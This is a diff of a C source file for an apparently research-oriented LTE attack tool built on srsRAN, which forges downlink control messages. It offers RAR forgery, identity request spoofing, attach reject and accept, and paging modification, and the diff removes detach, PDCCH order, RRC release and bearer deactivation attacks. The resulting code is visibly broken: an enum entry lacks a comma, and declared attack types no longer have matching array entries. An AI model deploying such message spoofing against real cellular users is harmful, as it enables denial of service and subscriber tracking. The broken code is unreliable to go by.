@@ -5,8 +5,6 @@
 #include "gen_sample.h"
 #include "srsran/json.hpp"
 #include <boost/filesystem.hpp>
-#include "MsgGeneratorForNoSni.h"
-
 using json = nlohmann::json;
 #define SRSRAN_SIRNTI 0xFFFF
 #define SRSRAN_PRNTI 0xFFFE
@@ -37,8 +35,8 @@ static uint32_t payload_len = 0;
 static cf_t* signal_buffer[SRSRAN_MAX_PORTS] = {NULL};
 static srsran_dl_sf_cfg_t sf_cfg_dl = {{0}};
 uint32_t preamble =  6;
-bool is_pdcch_order = false;
-bool write_pcap = false;
+
+
 void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* prog);
 int get_attack_type_from_name(const char* name);
 void parse_args(int argc, char **argv);
@@ -62,7 +60,7 @@ enum AttackType {
   DETACH_REQUEST,
   PDCCH_ORDER,
   RRC_CONNECTION_RELEASE,
-  DEA_EPS_BEA_CON_REQUEST,
+  Deactivate_EPS_Bearer_Context_Request
   ATTACK_TYPE_COUNT
 };
 struct AttackTypeInfo {
@@ -78,13 +76,8 @@ const AttackTypeInfo attack_types[ATTACK_TYPE_COUNT] = {
   {"rar",                  "Random Access Response Forgery"},
   {"sib1_ori",             "SIB1 Original (Normal)"},
   {"attach_reject",        "Attach Reject with Custom Cause"},
-  {"identity_request",     "Identity Request Spoofing"},
-  {"attach_accept",        "Attach Accept Message Generation"},
-  {"detach_request",       "Detach Request Message Generation"},
-  {"pdcch_order",          "PDCCH Order Message Generation"},
-  {"rrc_connection_release","RRC Connection Release Message Generation"},
-  {"dea_eps_bea_con_request","DEA EPS Bearer Context Request Message Generation"}
-
+  {"identity_request",     "Identity Request Spoofing"},  // 新增
+  {"attach_accept",        "Attach Accept Message Generation"}
 };
 void usage(const char *prog) {
   printf("Usage: %s [options]\n", prog);
@@ -108,7 +101,7 @@ void usage(const char *prog) {
   printf("  Attach Reject:          %s --type attach_reject -r 0x46 -s 5 -o out_rej -p 100 -c 420\n", prog);
 }
 
-static const char* optstring = "c:f:p:s:r:o:m:i:hv:w";
+static const char* optstring = "c:f:p:s:r:o:m:i:hv";
 static struct option long_options[] = {
     {"type", required_argument, 0, 'T'},
     {0, 0, 0, 0}
@@ -120,9 +113,6 @@ void parse_args(int argc, char **argv) {
   optind = 1;
   while ((opt = getopt_long(argc, argv, optstring, long_options, &option_index)) != -1) {
     switch (opt) {
-      case 'w':
-        write_pcap = true;
-        break;
       case 'c':
         cell.id = (uint32_t)strtol(optarg, NULL, 10);
         break;
@@ -248,9 +238,6 @@ int main(int argc, char** argv) {
       return -1;
   }
   generate_message(payload, &payload_len, argv[0]);
-  /*if (write_pcap) {
-    write_dl_pcap(enb_dl, tti, rnti, attack_types[attack_type].name);
-  }*/
 
   sf_cfg_dl.tti = tti;
   sf_cfg_dl.cfi = cfi;
@@ -262,12 +249,9 @@ int main(int argc, char** argv) {
   srsran_dci_cfg_t dci_cfg = {0,};
   dci.location = dci_locations[0];
   //test yg 0730 add pdcch order
-
-  if (is_pdcch_order) {
-    dci.is_pdcch_order = true;
-    dci.preamble_idx   = 6;
-    dci.prach_mask_idx = 1;
-  }
+  //dci.is_pdcch_order = true;
+  //dci.preamble_idx   = 6;
+  //dci.prach_mask_idx = 1;
   generate_format1a_broadcast(payload_len, cell.nof_prb, 0, rnti, &dci);
   srsran_enb_dl_put_base(enb_dl, &sf_cfg_dl);
   if (srsran_enb_dl_put_pdcch_dl(enb_dl, &dci_cfg, &dci)) {
@@ -340,9 +324,6 @@ int main(int argc, char** argv) {
 }
 
 void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* prog){
-
-  MsgGeneratorForNoSni Msggen;
-
   switch (attack_type) {
     case PAGING_SYSINFOMOD:
       rnti = SRSRAN_PRNTI;
@@ -405,24 +386,7 @@ void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* pro
       printf("\n[RUN] Start to generate Attach Accept msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
       gen_attach_accept_pdu(payload[0], sizeof(uint8_t) * 2048, payload_len);
       break;
-    case DETACH_REQUEST:
-      printf("\n[RUN] Start to generate Detach Request msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
-      Msggen.gen_detach_request_pdu(payload[0], payload_len);
-      break;
-    case PDCCH_ORDER:
-      printf("\n[RUN] Start to generate PDCCH Order msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
-      is_pdcch_order = true;
-      gen_paging_sysinfmod(payload[0], sizeof(uint8_t) * 2048, payload_len);
-      //Msggen.gen_pdcch_order_pdu(payload[0], payload_len, preamble);
-      break;
-    case RRC_CONNECTION_RELEASE:
-      printf("\n[RUN] Start to generate RRC Connection Release msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
-      Msggen.gen_rrc_connection_release_pdu(payload[0], payload_len);
-      break;
-    case DEA_EPS_BEA_CON_REQUEST:
-      printf("\n[RUN] Start to generate DEA EPS Bearer Context Request msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
-      Msggen.gen_deactivate_eps_bearer_request_pdu(payload[0], payload_len);
-      break;
+
     default:
       fprintf(stderr, "[ERROR] Unknown attack type: %d\n", attack_type);
       usage(prog);
@@ -467,7 +431,7 @@ int generate_format1a_broadcast(uint32_t tbs_bytes, uint32_t cell_nof_prb, uint3
       break;
       }
   }
-  //printf("Selected MCS index: %d prb:%d\n", mcs, l_crb);
+  printf("Selected MCS index: %d prb:%d\n", mcs, l_crb);
   if (i == 28) {
       ERROR("Can't allocate Format 1A for TBS=%d\n", tbs);
       return -1;
